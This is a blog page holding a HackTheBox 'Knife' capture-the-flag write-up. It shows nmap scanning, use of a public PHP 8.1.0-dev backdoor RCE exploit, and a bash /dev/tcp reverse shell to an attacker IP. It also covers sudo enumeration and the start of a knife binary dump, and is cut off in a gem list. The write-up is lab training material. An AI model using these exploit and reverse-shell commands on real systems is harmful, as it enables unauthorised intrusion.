<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.20.2 by Michael Rose
  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>HackTheBox Machine - Knife | Tri Wanda Septian’s Blog</title>
<meta name="description" content="">


  <meta name="author" content="Tri Wanda Septian">
  
  <meta property="article:author" content="Tri Wanda Septian">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="Tri Wanda Septian's Blog">
<meta property="og:title" content="HackTheBox Machine - Knife">
<meta property="og:url" content="http://localhost:4000/hackthebox%20machine/htb-machine-knife/">


  <meta property="og:description" content="">



  <meta property="og:image" content="http://localhost:4000/assets/images/htb-frame.png">



  <meta name="twitter:site" content="@twseptian_">
  <meta name="twitter:title" content="HackTheBox Machine - Knife">
  <meta name="twitter:description" content="">
  <meta name="twitter:url" content="http://localhost:4000/hackthebox%20machine/htb-machine-knife/">

  
    <meta name="twitter:card" content="summary">
    
      <meta name="twitter:image" content="http://localhost:4000/assets/images/htb-frame.png">
    
  

  



  <meta property="article:published_time" content="2021-08-30T00:00:00+07:00">



  <meta property="article:modified_time" content="2021-08-30T21:51:00+07:00">



  

  


<link rel="canonical" href="http://localhost:4000/hackthebox%20machine/htb-machine-knife/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "Tri Wanda Septian's Blog and Stuff",
      "url": "http://localhost:4000/",
      "sameAs": ["https://twitter.com/twsepian_","https://github.com/twseptian"]
    
  }
</script>


  <meta name="google-site-verification" content="KJV9Ip5Mlud9lmDhN6pzfrcplPaoPSnsaOptFO6aIwE" />


  <meta name="msvalidate.01" content="A990426F952EA8940B6F2C13C11817E3">




<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Tri Wanda Septian's Blog Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css">

<!--[if IE]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->




    <!-- start custom head snippets -->
<meta name="msvalidate.01" content="A990426F952EA8940B6F2C13C11817E3" />
<!-- insert favicons. use https://realfavicongenerator.net/ -->
<link rel="apple-touch-icon" sizes="120x120" href="/assets/images/favicon/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/images/favicon/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/images/favicon/favicon-16x16.png">
<link rel="manifest" href="/assets/images/favicon/site.webmanifest">
<link rel="mask-icon" href="/assets/images/favicon/safari-pinned-tab.svg" color="#5bbad5">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="theme-color" content="#ffffff">
<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <h2 class="screen-reader-text">Skip links</h2>
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/ava.png" alt=""></a>
        
        <a class="site-title" href="/">
          Tri Wanda Septian
          <span class="site-subtitle">#neverstoplearning #lifelonglearning</span>
        </a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/">home</a>
            </li><li class="masthead__menu-item">
              <a href="/year-archive/">posts</a>
            </li><li class="masthead__menu-item">
              <a href="/tags/">tags</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/">categories</a>
            </li><li class="masthead__menu-item">
              <a href="/about/">about me</a>
            </li></ul>
        
        <button class="search__toggle" type="button">
          <span class="visually-hidden">Toggle search</span>
          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
          </svg>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>

    
    <aside class="sidebar__top">
      <a href="#site-nav"><i class="fas fa-chevron-circle-up fa-2x"></i></a>
      </aside>

    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/assets/images/avatar_backup.png" alt="Tri Wanda Septian" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">Tri Wanda Septian</h3>
    
    
      <div class="author__bio" itemprop="description">
        <p>Researcher, Infosec practioner,<br />CTF Player, Perpetual Learner.</p>

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Indonesia</span>
        </li>
      

      
        
          
            <li><a href="https://twseptian.github.io" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
          
        
          
            <li><a href="mailto:twseptian@gmail.com" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-envelope" aria-hidden="true"></i><span class="label">Email</span></a></li>
          
        
          
            <li><a href="https://github.com/twseptian" rel="nofollow noopener noreferrer"><i class="fab fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
          
        
          
            <li><a href="https://gitlab.com/twseptian/" rel="nofollow noopener noreferrer"><i class="fab fa-gitlab" aria-hidden="true"></i><span class="label">GitLab</span></a></li>
          
        
          
            <li><a href="https://twitter.com/twseptian_" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://www.linkedin.com/in/twseptian/" rel="nofollow noopener noreferrer"><i class="fab fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>




  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="HackTheBox Machine - Knife">
    <meta itemprop="description" content="">
    <meta itemprop="datePublished" content="2021-08-30T00:00:00+07:00">
    <meta itemprop="dateModified" content="2021-08-30T21:51:00+07:00">

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">HackTheBox Machine - Knife
</h1>
          
          

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-calendar-alt" aria-hidden="true"></i>
        <time datetime="2021-08-30T00:00:00+07:00">August 30, 2021</time>
      </span>
    
    
    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          9 minute read
        
      </span>
        
  </p>
  



          <section class="page__share">
  
    <!--<h4 class="page__share-title">Share on</h4>-->
  

  <a href="https://twitter.com/intent/tweet?via=twseptian_&text=HackTheBox+Machine+-+Knife%20http%3A%2F%2Flocalhost%3A4000%2Fhackthebox%2520machine%2Fhtb-machine-knife%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i></a>

  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fhackthebox%2520machine%2Fhtb-machine-knife%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i></a>

  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fhackthebox%2520machine%2Fhtb-machine-knife%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i></a>
  
  <a href="https://www.buymeacoffee.com/twseptian"><img src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee&emoji=☕&slug=twseptian&button_colour=5F7FFF&font_colour=ffffff&font_family=Lato&outline_colour=000000&coffee_colour=FFDD00" width="160",height="160"></a>
</section>

          
        </header>
      

      <section class="page__content" itemprop="text">
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> Contents</h4></header>
              <ul class="toc__menu">
  <li><a href="#summary">Summary</a></li>
  <li><a href="#network-scanning">Network Scanning</a></li>
  <li><a href="#enumeration">Enumeration</a>
    <ul>
      <li><a href="#port-80---http-service-php-810-dev-vulnerability">Port 80 - http service, PHP 8.1.0-dev vulnerability</a></li>
    </ul>
  </li>
  <li><a href="#privilege-escalation">Privilege Escalation</a>
    <ul>
      <li><a href="#knife-privillege-escalation-via-ruby-gem-execution">Knife privillege escalation via ruby gem execution</a></li>
      <li><a href="#knife-sudo-privillege-escalation">Knife sudo privillege escalation</a></li>
    </ul>
  </li>
</ul>

            </nav>
          </aside>
        
        <p><img src="/assets/images/htb-machine-knife/intro.png" alt="HTB Knife" /></p>

<h1 id="summary">Summary</h1>
<ul>
  <li>PHP 8.1.0-dev - ‘User-Agentt’ Remote Code Execution</li>
  <li>Knife privillege escalation via ruby gem execution</li>
  <li>Knife sudo privillege escalation</li>
</ul>

<h1 id="network-scanning">Network Scanning</h1>
<p>Nmap network scanning result:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Nmap 7.91 scan initiated Sun Jun 13 11:15:22 2021 as: nmap -vvv -p 22,80 -sC -sV -T4 -A -oN nmap 10.129.160.5</span>
Nmap scan report <span class="k">for </span>10.129.160.5
Host is up, received syn-ack <span class="o">(</span>0.29s latency<span class="o">)</span><span class="nb">.</span>
Scanned at 2021-06-13 11:15:22 WIB <span class="k">for </span>18s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 <span class="o">(</span>RSA<span class="o">)</span>
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCjEtN3+WZzlvu54zya9Q+D0d/jwjZT2jYFKwHe0icY7plEWSAqbP+b3ijRL6kv522KEJPHkfXuRwzt5z4CNpyUnqr6nQINn8DU0Iu/UQby+6OiQIleNUCYYaI+1mV0sm4kgmue4oVI1Q3JYOH41efTbGDFHiGSTY1lH3HcAvOFh75dCID0564T078p7ZEIoKRt1l7Yz+GeMZ870Nw13ao0QLPmq2HnpQS34K45zU0lmxIHqiK/IpFJOLfugiQF52Qt6+gX3FOjPgxk8rk81DEwicTrlir2gJiizAOchNPZjbDCnG2UqTapOm292Xg0hCE6H03Ri6GtYs5xVFw/KfGSGb7OJT1jhitbpUxRbyvP+pFy4/8u6Ty91s98bXrCyaEy2lyZh5hm7MN2yRsX+UbrSo98UfMbHkKnePg7/oBhGOOrUb77/DPePGeBF5AT029Xbz90v2iEFfPdcWj8SP/p2Fsn/qdutNQ7cRnNvBVXbNm0CpiNfoHBCBDJ1LR8p8k<span class="o">=</span>
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee <span class="o">(</span>ECDSA<span class="o">)</span>
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGKC3ouVMPI/5R2Fsr5b0uUQGDrAa6ev8uKKp5x8wdqPXvM1tr4u0GchbVoTX5T/PfJFi9UpeDx/uokU3chqcFc<span class="o">=</span>
|   256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 <span class="o">(</span>ED25519<span class="o">)</span>
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJbkxEqMn++HZ2uEvM0lDZy+TB8B8IAeWRBEu3a34YIb
80/tcp open  http    syn-ack Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Sun Jun 13 11:15:40 2021 -- 1 IP address (1 host up) scanned in 18.21 seconds</span>
</code></pre></div></div>

<h1 id="enumeration">Enumeration</h1>
<p>From Nmap network scanning, we found two ports: port 22, and port 80. Let’s enumerate port 80.</p>
<h2 id="port-80---http-service-php-810-dev-vulnerability">Port 80 - http service, PHP 8.1.0-dev vulnerability</h2>
<p>Port 80, the HTTP service was run with server technology <code class="language-plaintext highlighter-rouge">Apache 2.4.41</code>, and the web page contained a static webpage, so we tried to enumerate on the header from the web page.
<img src="/assets/images/htb-machine-knife/port80-1.png" alt="Port 80 web service" /></p>

<p>The webpage was powered by <code class="language-plaintext highlighter-rouge">PHP 8.1.0-dev</code></p>

<p><img src="/assets/images/htb-machine-knife/port80-2.png" alt="Port 80 web service" /></p>

<p>Let’s find the vulnerability of <code class="language-plaintext highlighter-rouge">PHP 8.1.0-dev</code> using <code class="language-plaintext highlighter-rouge">searchploit</code>:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>searchsploit <span class="s1">'PHP 8.1.0-dev'</span>
<span class="nt">--------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
 Exploit Title                                                                  |  Path
<span class="nt">--------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
<span class="o">[</span>SNIP]
PHP 8.1.0-dev - <span class="s1">'User-Agentt'</span> Remote Code Execution                             | php/webapps/49933.py
<span class="o">[</span>SNIP]
<span class="nt">--------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
</code></pre></div></div>
<p>and, another information from exploit-db - PHP 8.1.0-dev - ‘User-Agentt’ Remote Code Execution - <a href="https://www.exploit-db.com/exploits/49933">https://www.exploit-db.com/exploits/49933</a></p>

<p><img src="/assets/images/htb-machine-knife/php8dev.png" alt="PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution" /></p>

<p>Then, download the exploit script into our kali machine, and let’s run the exploit, then put url target.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>twseptian㉿lab<span class="o">)</span>-[~/lab/hackthebox/boxes/knife]
└─<span class="nv">$ </span>python3 49933.py 
Enter the full host url:
http://10.129.160.5/

Interactive shell is opened on http://10.129.160.5/ 
Can<span class="s1">'t acces tty; job crontol turned off.
$ id
uid=1000(james) gid=1000(james) groups=1000(james)

$ 
</span></code></pre></div></div>
<p>let’s create a new reverse shell connection</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>/bin/bash <span class="nt">-c</span> <span class="s2">"bash -i &gt;&amp; /dev/tcp/10.10.14.30/4444 0&gt;&amp;1"</span>
</code></pre></div></div>
<p>prepare the reverse shell <code class="language-plaintext highlighter-rouge">nc -lvnp 4444</code></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>twseptian㉿lab<span class="o">)</span>-[~/lab/hackthebox/boxes/knife]
└─<span class="nv">$ </span>nc <span class="nt">-lvnp</span> 4444                                                                                             1 ⨯
Ncat: Version 7.91 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.129.160.5.
Ncat: Connection from 10.129.160.5:47146.
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>862<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
james@knife:/<span class="err">$</span>
james@knife:~<span class="nv">$ </span><span class="nb">cd</span> /home/james
<span class="nb">cd</span> /home/james
james@knife:~<span class="nv">$ </span>
james@knife:~<span class="nv">$ </span><span class="nb">wc</span> <span class="nt">-c</span> user.txt
<span class="nb">wc</span> <span class="nt">-c</span> user.txt
33 user.txt
james@knife:~<span class="nv">$ </span>
</code></pre></div></div>

<h1 id="privilege-escalation">Privilege Escalation</h1>
<p>check <code class="language-plaintext highlighter-rouge">sudo -l</code></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james@knife:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>james on knife:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User james may run the following commands on knife:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/knife
</code></pre></div></div>
<h2 id="knife-privillege-escalation-via-ruby-gem-execution">Knife privillege escalation via ruby gem execution</h2>
<p>check strings of <code class="language-plaintext highlighter-rouge">/usr/bin/knife</code></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/opt/chef-workstation/embedded/bin/ruby --disable-gems</span>
<span class="c">#--APP_BUNDLER_BINSTUB_FORMAT_VERSION=1--</span>
require <span class="s2">"rubygems"</span>

begin
  <span class="c"># this works around rubygems/rubygems#2196 and can be removed in rubygems &gt; 2.7.6</span>
  require <span class="s2">"rubygems/bundler_version_finder"</span>
rescue LoadError
  <span class="c"># probably means rubygems is too old or too new to have this class, and we don't care</span>
end

<span class="c"># avoid appbundling if we are definitely running within a Bundler bundle.</span>
<span class="c"># most likely the check for defined?(Bundler) is enough since we don't require</span>
<span class="c"># bundler above, but just for paranoia's sake also we test to see if Bundler is</span>
<span class="c"># really doing its thing or not.</span>
unless defined?<span class="o">(</span>Bundler<span class="o">)</span> <span class="o">&amp;&amp;</span> Bundler.instance_variable_defined?<span class="o">(</span><span class="s2">"@load"</span><span class="o">)</span>
  ENV[<span class="s2">"GEM_HOME"</span><span class="o">]</span> <span class="o">=</span> ENV[<span class="s2">"GEM_PATH"</span><span class="o">]</span> <span class="o">=</span> nil unless ENV[<span class="s2">"APPBUNDLER_ALLOW_RVM"</span><span class="o">]</span> <span class="o">==</span> <span class="s2">"true"</span>
  ::Gem.clear_paths

  gem <span class="s2">"activesupport"</span>, <span class="s2">"= 5.2.4.5"</span>
  gem <span class="s2">"addressable"</span>, <span class="s2">"= 2.7.0"</span>
  gem <span class="s2">"appbundler"</span>, <span class="s2">"= 0.13.2"</span>
  gem <span class="s2">"artifactory"</span>, <span class="s2">"= 3.0.15"</span>
  gem <span class="s2">"ast"</span>, <span class="s2">"= 2.4.2"</span>
  gem <span class="s2">"aws-eventstream"</span>, <span class="s2">"= 1.1.0"</span>
  gem <span class="s2">"aws-partitions"</span>, <span class="s2">"= 1.427.0"</span>
  gem <span class="s2">"aws-sdk-apigateway"</span>, <span class="s2">"= 1.59.0"</span>
  gem <span class="s2">"aws-sdk-apigatewayv2"</span>, <span class="s2">"= 1.31.0"</span>
  gem <span class="s2">"aws-sdk-applicationautoscaling"</span>, <span class="s2">"= 1.49.0"</span>
  gem <span class="s2">"aws-sdk-athena"</span>, <span class="s2">"= 1.35.0"</span>
  gem <span class="s2">"aws-sdk-autoscaling"</span>, <span class="s2">"= 1.53.0"</span>
  gem <span class="s2">"aws-sdk-batch"</span>, <span class="s2">"= 1.43.0"</span>
  gem <span class="s2">"aws-sdk-budgets"</span>, <span class="s2">"= 1.37.0"</span>
  gem <span class="s2">"aws-sdk-cloudformation"</span>, <span class="s2">"= 1.47.0"</span>
  gem <span class="s2">"aws-sdk-cloudfront"</span>, <span class="s2">"= 1.48.0"</span>
  gem <span class="s2">"aws-sdk-cloudhsm"</span>, <span class="s2">"= 1.28.0"</span>
  gem <span class="s2">"aws-sdk-cloudhsmv2"</span>, <span class="s2">"= 1.32.0"</span>
  gem <span class="s2">"aws-sdk-cloudtrail"</span>, <span class="s2">"= 1.33.0"</span>
  gem <span class="s2">"aws-sdk-cloudwatch"</span>, <span class="s2">"= 1.49.0"</span>
  gem <span class="s2">"aws-sdk-cloudwatchevents"</span>, <span class="s2">"= 1.40.0"</span>
  gem <span class="s2">"aws-sdk-cloudwatchlogs"</span>, <span class="s2">"= 1.39.0"</span>
  gem <span class="s2">"aws-sdk-codecommit"</span>, <span class="s2">"= 1.41.0"</span>
  gem <span class="s2">"aws-sdk-codedeploy"</span>, <span class="s2">"= 1.38.0"</span>
  gem <span class="s2">"aws-sdk-codepipeline"</span>, <span class="s2">"= 1.41.0"</span>
  gem <span class="s2">"aws-sdk-cognitoidentity"</span>, <span class="s2">"= 1.29.0"</span>
  gem <span class="s2">"aws-sdk-cognitoidentityprovider"</span>, <span class="s2">"= 1.48.0"</span>
  gem <span class="s2">"aws-sdk-configservice"</span>, <span class="s2">"= 1.57.0"</span>
  gem <span class="s2">"aws-sdk-core"</span>, <span class="s2">"= 3.112.0"</span>
  gem <span class="s2">"aws-sdk-costandusagereportservice"</span>, <span class="s2">"= 1.29.0"</span>
  gem <span class="s2">"aws-sdk-databasemigrationservice"</span>, <span class="s2">"= 1.50.0"</span>
  gem <span class="s2">"aws-sdk-dynamodb"</span>, <span class="s2">"= 1.59.0"</span>
  gem <span class="s2">"aws-sdk-ec2"</span>, <span class="s2">"= 1.224.0"</span>
  gem <span class="s2">"aws-sdk-ecr"</span>, <span class="s2">"= 1.41.0"</span>
  gem <span class="s2">"aws-sdk-ecs"</span>, <span class="s2">"= 1.74.0"</span>
  gem <span class="s2">"aws-sdk-efs"</span>, <span class="s2">"= 1.37.0"</span>
  gem <span class="s2">"aws-sdk-eks"</span>, <span class="s2">"= 1.48.0"</span>
  gem <span class="s2">"aws-sdk-elasticache"</span>, <span class="s2">"= 1.53.0"</span>
  gem <span class="s2">"aws-sdk-elasticbeanstalk"</span>, <span class="s2">"= 1.41.0"</span>
  gem <span class="s2">"aws-sdk-elasticloadbalancing"</span>, <span class="s2">"= 1.30.0"</span>
  gem <span class="s2">"aws-sdk-elasticloadbalancingv2"</span>, <span class="s2">"= 1.60.0"</span>
  gem <span class="s2">"aws-sdk-elasticsearchservice"</span>, <span class="s2">"= 1.48.0"</span>
  gem <span class="s2">"aws-sdk-firehose"</span>, <span class="s2">"= 1.36.0"</span>
  gem <span class="s2">"aws-sdk-glue"</span>, <span class="s2">"= 1.82.0"</span>
  gem <span class="s2">"aws-sdk-guardduty"</span>, <span class="s2">"= 1.44.0"</span>
  gem <span class="s2">"aws-sdk-iam"</span>, <span class="s2">"= 1.48.0"</span>
  gem <span class="s2">"aws-sdk-kafka"</span>, <span class="s2">"= 1.34.0"</span>
  gem <span class="s2">"aws-sdk-kinesis"</span>, <span class="s2">"= 1.31.0"</span>
  gem <span class="s2">"aws-sdk-kms"</span>, <span class="s2">"= 1.42.0"</span>
  gem <span class="s2">"aws-sdk-lambda"</span>, <span class="s2">"= 1.59.0"</span>
  gem <span class="s2">"aws-sdk-organizations"</span>, <span class="s2">"= 1.55.0"</span>
  gem <span class="s2">"aws-sdk-ram"</span>, <span class="s2">"= 1.22.0"</span>
  gem <span class="s2">"aws-sdk-rds"</span>, <span class="s2">"= 1.114.0"</span>
  gem <span class="s2">"aws-sdk-redshift"</span>, <span class="s2">"= 1.54.0"</span>
  gem <span class="s2">"aws-sdk-route53"</span>, <span class="s2">"= 1.46.0"</span>
  gem <span class="s2">"aws-sdk-route53domains"</span>, <span class="s2">"= 1.29.0"</span>
  gem <span class="s2">"aws-sdk-route53resolver"</span>, <span class="s2">"= 1.23.0"</span>
  gem <span class="s2">"aws-sdk-s3"</span>, <span class="s2">"= 1.88.1"</span>
  gem <span class="s2">"aws-sdk-secretsmanager"</span>, <span class="s2">"= 1.43.0"</span>
  gem <span class="s2">"aws-sdk-securityhub"</span>, <span class="s2">"= 1.40.0"</span>
  gem <span class="s2">"aws-sdk-servicecatalog"</span>, <span class="s2">"= 1.57.0"</span>
  gem <span class="s2">"aws-sdk-ses"</span>, <span class="s2">"= 1.37.0"</span>
  gem <span class="s2">"aws-sdk-shield"</span>, <span class="s2">"= 1.34.0"</span>
  gem <span class="s2">"aws-sdk-sms"</span>, <span class="s2">"= 1.28.0"</span>
  gem <span class="s2">"aws-sdk-sns"</span>, <span class="s2">"= 1.38.0"</span>
  gem <span class="s2">"aws-sdk-sqs"</span>, <span class="s2">"= 1.36.0"</span>
  gem <span class="s2">"aws-sdk-ssm"</span>, <span class="s2">"= 1.104.0"</span>
  gem <span class="s2">"aws-sdk-states"</span>, <span class="s2">"= 1.37.0"</span>
  gem <span class="s2">"aws-sdk-transfer"</span>, <span class="s2">"= 1.29.0"</span>
  gem <span class="s2">"aws-sigv4"</span>, <span class="s2">"= 1.2.2"</span>
  gem <span class="s2">"axiom-types"</span>, <span class="s2">"= 0.1.1"</span>
  gem <span class="s2">"azure_graph_rbac"</span>, <span class="s2">"= 0.17.2"</span>
  gem <span class="s2">"azure_mgmt_compute"</span>, <span class="s2">"= 0.21.1"</span>
  gem <span class="s2">"azure_mgmt_key_vault"</span>, <span class="s2">"= 0.17.7"</span>
  gem <span class="s2">"azure_mgmt_network"</span>, <span class="s2">"= 0.26.0"</span>
  gem <span class="s2">"azure_mgmt_resources"</span>, <span class="s2">"= 0.18.1"</span>
  gem <span class="s2">"azure_mgmt_security"</span>, <span class="s2">"= 0.19.0"</span>
  gem <span class="s2">"azure_mgmt_storage"</span>, <span class="s2">"= 0.22.0"</span>
  gem <span class="s2">"bcrypt_pbkdf"</span>, <span class="s2">"= 1.1.0.rc2"</span>
  gem <span class="s2">"bcrypt_pbkdf"</span>, <span class="s2">"= 1.1.0.rc2"</span>
  gem <span class="s2">"bcrypt_pbkdf"</span>, <span class="s2">"= 1.1.0.rc2"</span>
  gem <span class="s2">"berkshelf"</span>, <span class="s2">"= 7.2.0"</span>
  gem <span class="s2">"binding_of_caller"</span>, <span class="s2">"= 1.0.0"</span>
  gem <span class="s2">"builder"</span>, <span class="s2">"= 3.2.4"</span>
  gem <span class="s2">"byebug"</span>, <span class="s2">"= 11.1.3"</span>
  gem <span class="s2">"chef"</span>, <span class="s2">"= 16.10.8"</span>
  gem <span class="s2">"chef"</span>, <span class="s2">"= 16.10.8"</span>
  gem <span class="s2">"chef-apply"</span>, <span class="s2">"= 0.5.3"</span>
  gem <span class="s2">"chef-bin"</span>, <span class="s2">"= 16.10.8"</span>
  gem <span class="s2">"chef-cli"</span>, <span class="s2">"= 3.1.1"</span>
  gem <span class="s2">"chef-config"</span>, <span class="s2">"= 16.10.8"</span>
  gem <span class="s2">"chef-telemetry"</span>, <span class="s2">"= 1.0.14"</span>
  gem <span class="s2">"chef-utils"</span>, <span class="s2">"= 16.10.8"</span>
  gem <span class="s2">"chef-vault"</span>, <span class="s2">"= 4.1.0"</span>
  gem <span class="s2">"chef-zero"</span>, <span class="s2">"= 15.0.4"</span>
  gem <span class="s2">"chef_deprecations"</span>, <span class="s2">"= 0.1.2"</span>
  gem <span class="s2">"cheffish"</span>, <span class="s2">"= 16.0.12"</span>
  gem <span class="s2">"chefspec"</span>, <span class="s2">"= 9.2.1"</span>
  gem <span class="s2">"chefstyle"</span>, <span class="s2">"= 1.7.1"</span>
  gem <span class="s2">"citrus"</span>, <span class="s2">"= 3.0.2"</span>
